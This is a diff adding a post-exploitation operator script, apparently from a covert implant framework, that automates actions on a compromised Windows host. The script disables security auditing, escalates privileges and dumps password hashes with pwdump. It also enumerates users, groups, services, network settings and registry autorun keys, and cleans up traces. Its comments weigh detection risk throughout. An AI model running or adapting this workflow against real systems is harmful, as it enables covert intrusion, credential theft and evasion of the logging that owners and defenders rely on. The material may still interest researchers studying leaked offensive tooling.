@@ -1,0 +1,275 @@
+#20070423 - Completely rewritten
+#Philosophy: Make a modular as possible.  Only thing that should be in Simple are references to other scripts,
+#calls to simple plugins, and control structures based on what happens with the commands
+@include "UseMarkers.epm";
+@include "PerlFunctions.epm";
+
+@echo on;
+
+# Environment Variable to indicate whether Simple has finished
+SetEnv ("SIMPLE","FALSE");
+
+#####################################################
+#	Check Process List AND kick off Process Monitor
+#####################################################
+
+`log processlist`;
+echo "Starting process monitor:";
+if (`monitor processmonitor`) {
+    echo "    STARTED";
+} else {
+    echo "    FAILED";
+}
+pause;
+
+#####################################################
+#	Check for JUMPUP patch 
+#####################################################
+@echo off;
+@echo off;
+if( `regquery -hive L -subkey "software\\microsoft\\windows\\currentversion\\uninstall\\KB968537"`) {
+	echo "***********************************************************************";
+	echo "*                                                                     *";
+	echo "*  ALERT                                                              *";
+	echo "*                                                                     *";
+	echo "*  JUMPUP Patch Found!                                                *";
+	echo "*                                                                     *";
+	echo "*  Be sure you know what you can and cannot do.                       *";
+	echo "*                                                                     *";
+	echo "***********************************************************************";
+	pause;
+}
+@echo on;
+
+#####################################################
+#	Environment Variables
+#####################################################
+
+# Set up environment variables for other scripts
+`script setEnvs.eps`;
+
+####################################################
+#	Run PSP checks
+####################################################
+`checkpsp`;
+
+#####################################################
+#             Audit Section
+#####################################################
+
+SetEnv("auditOff","FALSE");
+
+if(`script disableauditing.eps`) {
+	SetEnv("auditOff","TRUE");
+}else{
+	SetEnv("auditOff","FALSE");
+}
+pause;
+
+#var for use in rest of simple.
+bool $auditOff = GetEnv("auditOff");
+
+
+####################################################
+#	Monitors
+####################################################
+`script StartMonitors.eps`;
+
+
+####################################################
+#	ProcessDeep
+####################################################
+bool $noProcInfo = GetEnv("noProcInfo");
+if($noProcInfo) {
+	echo "Skipping process info due to a security concern. It may get caught!";
+} else {
+	if (prompt "Run process info? *You should run normally run it*") {
+		`background script processdeep.eps`;
+	}
+}
+
+#####################################################
+#	Elevation Section
+#####################################################
+
+if (`script getPrivs.eps`) {
+	#if the script worked, check to see if we need to try disabling auditing again.
+	string $temp = GetEnv("auditOff");
+	string $alp = GetEnv("alreadyPriv");
+	if (($temp == "FALSE") && ($alp == "false")) {
+		echo "Detected that you couldn't disable auditing before.  Trying again now that you have admin.";
+		if(`script disableauditing.eps`){
+			SetEnv("auditOff","TRUE");
+		}else{
+			SetEnv("auditOff","FALSE");
+		}
+	}
+}
+
+pause;
+
+####################################################
+#	Check the version of PC
+####################################################
+`script checkPCversion.eps`;
+
+
+####################################################
+#	Check the install date
+####################################################
+`script checkDate.eps`;
+
+####################################################
+# 	Show the operator the system version
+####################################################
+`systemversion`;
+
+####################################################
+# 	Bad implant section
+####################################################
+`background script ifthen.eps --default`;
+
+####################################################
+#	Remove YAK
+####################################################
+#if (prompt "Do you want to check for YAK? (unless you know for sure, say YES.)") {
+	#	`script removeYak.eps`;
+#}
+#Moved yak check to background. Will pop a notepad window if it is found
+echo "\r#########################\rChecking for YAK in the background.\rA window will pop if it is found\r#########################\r";
+`background script removeYak2.eps`;
+
+#####################################################
+#             Machine/network Info Section
+#####################################################
+`background script hotfixes.eps`;
+`script syspath.eps`;
+`background script drivercheck.eps`;
+
+if (prompt "Do you want to do a driver list?") {
+	`script driverlist.eps`;
+}
+if (prompt "Do you want to query HKLM\\Software?") {
+	`reg_software`;
+}
+pause;
+
+`language`;
+`remotelocaltime`;
+prompt `background netmap`;
+`netbios -local`;
+`route`;
+`arp -print`;
+
+bool $noInject = GetEnv("noInject");
+if ($noInject) {
+	echo "Skipping pwdump due to a security concern. It may get caught!";
+} else {
+	ifnot (prompt `background pwdump`) {
+		pause;
+	}
+}
+
+string $osMaj = GetEnv("OSMAJOR");
+
+int $osMajint = <int>$osMaj;
+
+if ($osMajInt == 4) {
+	if (prompt "do you want to run ipconfig on the target?") {
+		`run -command "ipconfig.exe /all" -redirect ipconfig`;
+	}
+} else {
+	`ipconfig`;
+}
+
+ifnot (`script scheduler.eps`) {
+	pause;
+}
+`memory`;
+
+################################################################
+# drive info
+################################################################
+`script driveInfo.eps`;
+
+################################################################
+# Look for old stuff
+################################################################
+`log script cleanDirtyFiles2.eps`;
+pause;
+
+#####################################################
+#             User Info Section
+#####################################################
+
+if ($auditOff){
+	if (prompt "Do you want the target services,users,and groups? *** Only run if auditing disabled *** "){
+		`background services -local`;
+		`background users -local`;
+		`background groups -local`;
+		`background groups -global`;
+	}
+} else {
+	echo "Auditing was not disabled.  Not getting the target services, users, and groups.";
+	echo "These commands would likely get logged as Object Accesses in the Security Log.";
+}
+
+#####################################################
+#             Registry Section
+#####################################################
+
+# 15 May 07 - I don't know what the below comments intend.
+# TODO: log currentversion\\windows, background the rest
+#  (make parse.ep.pl parse them out of the regquery files)
+
+`regquery -hive L -subkey "SYSTEM\\currentcontrolset\\control\\session manager\\power" -value Heuristics`;
+`regquery -hive L -subkey "SYSTEM\\currentcontrolset\\services\\tcpip\\parameters\\winsock"`;
+`regquery -hive L -subkey "software\\microsoft\\windows nt\\currentversion\\winlogon"`;
+`regquery -hive L -subkey "software\\microsoft\\windows nt\\currentversion\\windows"`;
+`regquery -hive L -subkey "software\\microsoft\\windows\\currentversion\\run"`;
+`regquery -hive L -subkey "software\\microsoft\\windows\\currentversion\\runonce"`;
+`regquery -hive L -subkey "software\\microsoft\\windows\\currentversion\\runonceex"`;
+`regquery -hive L -subkey "hardware\\description\\system\\centralprocessor" -recursive`;
+
+#####################################################
+#             Clean up plugins
+#####################################################
+
+`background script freeplugins.eps`;
+
+#####################################################
+#		Get OTHER recurring data
+#		This script is for anything else that
+#		needs to be gotten on every op.
+#		The script should NOT prompt for user
+#		input because it is backgrounded.
+#####################################################
+
+`background script recurring.eps`;
+
+#####################################################
+#             End Script
+#####################################################
+`plugins`;
+`channels`;
+
+SetEnv("SIMPLE", "TRUE");
+
+return true;
+############################################################
+# subroutine to check for files
+#############################################################
+sub checkFile(IN string $filenameToCheck, IN string $pathToCheck)
+{
+	int $tempSize = 0;
+	@record on;
+	`dir "$filenameToCheck" -path "$pathToCheck" -max 0`;
+	@record off;
+	@echo off;
+	$tempSize = GetCmdData("size");
+	@echo on;
+	if(defined($tempSize)) {
+		return TRUE;
+	}
+	return FALSE;
+}
